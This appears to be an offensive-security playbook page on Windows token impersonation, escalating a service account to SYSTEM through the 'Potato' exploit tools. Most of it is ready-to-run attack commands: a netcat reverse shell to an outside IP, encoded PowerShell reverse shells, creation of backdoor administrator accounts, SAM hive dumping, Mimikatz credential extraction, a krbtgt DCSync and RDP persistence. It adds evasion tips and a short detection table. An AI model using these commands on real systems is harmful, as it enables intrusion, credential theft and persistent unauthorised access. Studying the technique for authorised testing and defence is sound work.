---
title: "Attack #45 — Token Impersonation (SeImpersonatePrivilege)"
description: "Token Impersonation is a local privilege escalation technique that exploits the Windows SeImpersonatePrivilege (or SeAssignPrimaryTokenPrivilege) to…"
category: active-directory
tags: ["active-directory", "adcs", "privilege-escalation", "sql-injection"]
tools: ["Impacket", "Mimikatz", "Metasploit", "Meterpreter", "PowerShell"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/AD-Attack/Category-Six/🟣 Attack #45 — Token Impersonation (SeImpersonatePrivilege).md"
---
# 🟣 Attack #45 — Token Impersonation (SeImpersonatePrivilege)

***

## 📖 How It Works

Token Impersonation is a **local privilege escalation technique** that exploits the Windows `SeImpersonatePrivilege` (or `SeAssignPrimaryTokenPrivilege`) to escalate from a service account to `NT AUTHORITY\SYSTEM` — the highest privilege level on a Windows system. This privilege is granted by default to all service accounts, IIS AppPool identities, MSSQL service accounts, and any process running as `NETWORK SERVICE` or `LOCAL SERVICE`. If an attacker compromises any of these accounts (via web shell, SQL injection, etc.), they can escalate to SYSTEM in seconds.

### How It Works Technically

1. **The attacker controls a process** with `SeImpersonatePrivilege` (e.g., a web shell running as `IIS APPPOOL\DefaultAppPool`)
2. **The attacker creates a listener** — typically a named pipe or a COM server that listens for incoming connections
3. **A SYSTEM-level process is tricked into authenticating** to the attacker's listener — this is achieved by abusing various Windows services (Print Spooler, BITS, DCOM/COM objects, RPC endpoints)
4. **The attacker captures the SYSTEM token** — when the privileged process connects, Windows lets the attacker impersonate the connecting client's security context because `SeImpersonatePrivilege` explicitly allows this
5. **The attacker spawns a new process** (cmd.exe, reverse shell, beacon) using the captured SYSTEM token

### The "Potato" Family Evolution

The Potato exploit family has evolved over 8+ years as Microsoft patched specific coercion methods, spawning new variants:

| Tool | Year | Coercion Method | Target OS | Status |
|---|---|---|---|---|
| **Hot Potato** | 2016 | NBNS spoofing + WPAD + NTLM relay | Win 7/8/10, Server 2008/2012 | ❌ Patched |
| **Rotten Potato** | 2016 | DCOM/BITS → NTLM relay to local OXID | Win 10, Server 2012/2016 | ❌ Patched |
| **Juicy Potato** | 2018 | Arbitrary CLSID COM abuse | Win ≤10 1803, Server ≤2016 | ⚠️ Partial |
| **Rogue Potato** | 2020 | Remote OXID resolution → named pipe | Win 10, Server 2019 | ✅ Works |
| **Sweet Potato** | 2020 | Combined — Print Bug + COM + WinRM | Multiple versions | ✅ Works |
| **PrintSpoofer** | 2020 | Print Spooler named pipe impersonation | Win 10, Server 2016/2019 | ✅ Works |
| **EfsPotato** | 2021 | EFS RPC → named pipe impersonation | Win 10/11, Server 2019/2022 | ✅ Works |
| **GodPotato** | 2022 | RPCSS DCOM activation → unnamed pipe | Win 2012–2022, Win 8–11 | ✅ Works |
| **SigmaPotato** | 2023 | GodPotato fork with improvements | Multiple versions | ✅ Works |
| **CoercedPotato** | 2024 | Multi-protocol coercion (MS-EFSR, MS-RPRN, etc.) | Multiple versions | ✅ Works |

### Why Service Accounts Have This Privilege

```
# Check current privileges:
whoami /priv

# If you see either of these, you can escalate:
# SeImpersonatePrivilege        Impersonate a client after authentication   Enabled
# SeAssignPrimaryTokenPrivilege Replace a process level token               Enabled

# These accounts typically have SeImpersonatePrivilege:
# - IIS AppPool accounts (web shells)
# - MSSQL Server service accounts (xp_cmdshell)
# - NETWORK SERVICE
# - LOCAL SERVICE
# - Any Windows service account
```

***

## ⚙️ Prerequisites

| Requirement | Detail |
|---|---|
| **Shell as service account** | Running as IIS AppPool, MSSQL, NETWORK SERVICE, or any account with `SeImpersonatePrivilege` |
| **SeImpersonatePrivilege enabled** | `whoami /priv` must show `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege` |
| **Local system access** | This is a LOCAL privilege escalation — you need a shell on the target machine |
| **Appropriate Potato tool** | Must match the target OS version (see compatibility table above) |

***

## 🛠️ Tools

| Tool | Platform | Notes |
|---|---|---|
| **GodPotato** | Windows | Most universally compatible — works on 2012-2022 |
| **PrintSpoofer** | Windows | Fast, clean — requires Print Spooler running |
| **JuicyPotato** | Windows | Classic — older systems only (≤ Win 10 1803) |
| **JuicyPotatoNG** | Windows | Updated version with better compatibility |
| **SweetPotato** | Windows | Combined approach — multiple coercion methods |
| **EfsPotato** | Windows | EFS-based — works on modern systems |
| **SigmaPotato** | Windows | GodPotato improvement — broader support |
| **CoercedPotato** | Windows | Multi-protocol — most comprehensive |
| **SharpEfsPotato** | Windows | .NET implementation of EFS Potato |
| **Incognito** | Meterpreter | Token manipulation via Meterpreter framework |

***

## 💻 Full Commands

### 🔵 Step 0 — Verify SeImpersonatePrivilege

```powershell
# ── Check if you have the required privilege ──────────────────────────────────
whoami /priv

# Expected output for exploitable service accounts:
# Privilege Name                Description                               State
# ============================= ========================================= ========
# SeImpersonatePrivilege        Impersonate a client after authentication Enabled
# SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
#                               (either one is sufficient)

# ── Check who you are ─────────────────────────────────────────────────────────
whoami
# Expected: iis apppool\defaultapppool, nt service\mssqlserver, etc.

# ── Check OS version (to pick the right Potato) ──────────────────────────────
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
[System.Environment]::OSVersion.Version
```

***

### 🔴 GodPotato (Recommended — Broadest Compatibility)

```powershell
# ── Spawn a SYSTEM command prompt ─────────────────────────────────────────────
.\GodPotato.exe -cmd "cmd /c whoami"
# Output: nt authority\system

# ── Execute a reverse shell as SYSTEM ─────────────────────────────────────────
.\GodPotato.exe -cmd "cmd /c powershell -e <base64_reverse_shell>"

# ── Create a new admin user as SYSTEM ─────────────────────────────────────────
.\GodPotato.exe -cmd "cmd /c net user hacker P@ssword123! /add && net localgroup Administrators hacker /add"

# ── Dump SAM database ────────────────────────────────────────────────────────
.\GodPotato.exe -cmd "cmd /c reg save HKLM\SAM C:\Temp\SAM && reg save HKLM\SYSTEM C:\Temp\SYSTEM"

# ── Run Mimikatz as SYSTEM ────────────────────────────────────────────────────
.\GodPotato.exe -cmd "cmd /c C:\Temp\mimikatz.exe privilege::debug sekurlsa::logonpasswords exit > C:\Temp\creds.txt"
```

***

### 🔴 PrintSpoofer (Clean & Fast — Requires Print Spooler)

```powershell
# ── Check if Print Spooler is running ─────────────────────────────────────────
Get-Service Spooler
sc query Spooler

# ── Spawn interactive SYSTEM shell ────────────────────────────────────────────
.\PrintSpoofer64.exe -i -c cmd
# Drops you into an interactive cmd.exe as SYSTEM

# ── Non-interactive command execution ─────────────────────────────────────────
.\PrintSpoofer64.exe -c "cmd /c whoami"
# Output: nt authority\system

# ── Reverse shell ─────────────────────────────────────────────────────────────
.\PrintSpoofer64.exe -c "cmd /c C:\Temp\nc.exe 10.10.14.5 4444 -e cmd.exe"

# ── 32-bit version (for 32-bit processes like IIS on x86 app pools) ──────────
.\PrintSpoofer32.exe -i -c cmd
```

***

### 🔴 JuicyPotato (Legacy — Older OS Only)

```powershell
# ── Basic SYSTEM shell ────────────────────────────────────────────────────────
.\JuicyPotato.exe -l 1337 -p cmd.exe -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}
# -l = COM listener port (arbitrary)
# -p = program to launch as SYSTEM
# -t = createprocess call type (* = try both)
# -c = CLSID to abuse (varies by OS — see below)

# ── Execute specific command ──────────────────────────────────────────────────
.\JuicyPotato.exe -l 1337 -p cmd.exe -a "/c whoami > C:\Temp\whoami.txt" \
  -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}

# ── Reverse shell ─────────────────────────────────────────────────────────────
.\JuicyPotato.exe -l 1337 -p cmd.exe \
  -a "/c powershell -e <base64_reverse_shell>" \
  -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}

# ── Common CLSIDs by OS ──────────────────────────────────────────────────────
# Windows 10 Pro:  {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}
# Windows Server 2016: {8F5DF053-3013-4dd8-B5F4-88214E81C0CF}
# Windows Server 2012: {e60687f7-01a1-40aa-86ac-db1cbf673334}
# Full CLSID list: https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md
```

***

### 🔴 EfsPotato (Modern Systems)

```powershell
# ── Compile and run (requires .NET framework) ────────────────────────────────
.\EfsPotato.exe whoami
# Output: nt authority\system

# ── Execute command ───────────────────────────────────────────────────────────
.\EfsPotato.exe "cmd /c net user hacker P@ssword123! /add"
.\EfsPotato.exe "cmd /c net localgroup Administrators hacker /add"
```

***

### 🔴 SweetPotato (Multi-Method)

```powershell
# ── Auto-detect best method ──────────────────────────────────────────────────
.\SweetPotato.exe -p cmd.exe -a "/c whoami"

# ── Specify method (PrintSpoofer technique) ───────────────────────────────────
.\SweetPotato.exe -e PrintSpoofer -p cmd.exe -a "/c whoami"

# ── WinRM method ──────────────────────────────────────────────────────────────
.\SweetPotato.exe -e WinRM -p cmd.exe -a "/c whoami"

# ── DCOM method (classic Juicy) ───────────────────────────────────────────────
.\SweetPotato.exe -e DCOM -p cmd.exe -a "/c whoami"
```

***

### 🔴 Meterpreter — Incognito Module (If Using Metasploit)

```bash
# ── From a Meterpreter session ────────────────────────────────────────────────
meterpreter> load incognito

# List available tokens
meterpreter> list_tokens -u
# Look for: NT AUTHORITY\SYSTEM, domain\admin_user, etc.

# Impersonate SYSTEM token
meterpreter> impersonate_token "NT AUTHORITY\SYSTEM"
# [+] Delegation token available
# [+] Successfully impersonated user NT AUTHORITY\SYSTEM

# Impersonate domain admin token (if one is logged in)
meterpreter> impersonate_token "CORP\domain_admin"

# Verify
meterpreter> getuid
# Server username: NT AUTHORITY\SYSTEM

# Drop to shell
meterpreter> shell
C:\> whoami
nt authority\system
```

***

### 🔴 Post-Exploitation — After SYSTEM

```powershell
# ── Once SYSTEM, extract all credentials ──────────────────────────────────────

# Dump all logon credentials from LSASS
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit

# Dump SAM database (local accounts)
reg save HKLM\SAM C:\Temp\SAM
reg save HKLM\SYSTEM C:\Temp\SYSTEM
reg save HKLM\SECURITY C:\Temp\SECURITY
# Exfiltrate and parse with secretsdump.py:
# secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL

# Enable RDP for persistence
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes

# Create a persistent admin account
net user backdoor P@ssword123! /add
net localgroup Administrators backdoor /add

# If domain-joined, DCSync is now possible from this machine
mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:corp.local /user:krbtgt" exit
```

***

## 🎯 OPSEC Tips

- **GodPotato is the safest choice** — it works on the widest range of OS versions (2012-2022) and doesn't require specific services to be running
- **PrintSpoofer is fastest** but requires Print Spooler — check `sc query Spooler` first; if it's disabled, use GodPotato
- **JuicyPotato won't work** on Windows 10 build 1809+ or Server 2019+ — Microsoft blocked the DCOM activation path
- **Avoid dropping binaries to disk** if possible — use in-memory execution via PowerShell reflection or .NET assembly loading
- **The Potato exploit itself is not detected** as easily as what you do AFTER getting SYSTEM — credential dumping and admin account creation are the loud parts
- **Token impersonation via Meterpreter/Incognito** is useful when there's a logged-in admin session on the box — you can steal their token without knowing their password

***

## 🛡️ Detection — Event IDs

| Event ID | Source | What to Look For |
|---|---|---|
| **4688** | Security Log | Process creation — unexpected `cmd.exe` or `powershell.exe` spawned by service accounts (IIS, MSSQL, etc.) |
| **4672** | Security Log | Special privileges assigned to new logon — SYSTEM token usage from unexpected source |
| **4624** | Security Log | New logon — SYSTEM logon (Type 2 or 5) from unexpected parent process |
| **7045** | System Log | New service installed — some Potato variants create temporary services |
| **Sysmon 10** | Sysmon | Process access — tool accessing LSASS memory (post-exploitation) |
| **Sysmon 1** | Sysmon | Process creation with full command line — Potato binary execution |
| **Sysmon 17/18** | Sysmon | Named pipe creation/connection — PrintSpoofer creates `\\.\pipe\spoolss` variants |

**Primary detection signature:** Monitor for **unexpected parent-child process relationships** involving service accounts. If `w3wp.exe` (IIS), `sqlservr.exe` (MSSQL), or `svchost.exe` spawns `cmd.exe` or `powershell.exe` as SYSTEM, that is a near-certain indicator of token impersonation. Sysmon with proper configuration provides the most reliable detection through process creation events with full command lines and named pipe monitoring.

***

## 🔗 Attack Chain Context

```
[Token Impersonation] ──→ Local SYSTEM Privilege Escalation
         │
         ├──→ 🌐 Web shell (IIS) → SeImpersonatePrivilege → SYSTEM → credentials
         ├──→ 🗄️ SQL injection (MSSQL xp_cmdshell) → SYSTEM → lateral movement
         ├──→ 🔑 SYSTEM → dump LSASS → extract domain creds → DCSync
         ├──→ 💻 SYSTEM → read DPAPI secrets, SAM hives, LSA secrets
         ├──→ 🔗 Chain with: PtH (Attack #4), DCSync (#37), lateral movement (#54-60)
         ├──→ 🔄 Commonly the first escalation after initial web/SQL compromise
         └──→ 💀 Defeated by: don't grant SeImpersonatePrivilege, use gMSAs, patch
```

**Token Impersonation is the most common local privilege escalation** in real-world engagements. Nearly every web application compromise or SQL injection that yields command execution results in a service account shell with SeImpersonatePrivilege — and from there, SYSTEM is one binary execution away.

***

> ✅ **Attack #45 — Token Impersonation complete.**
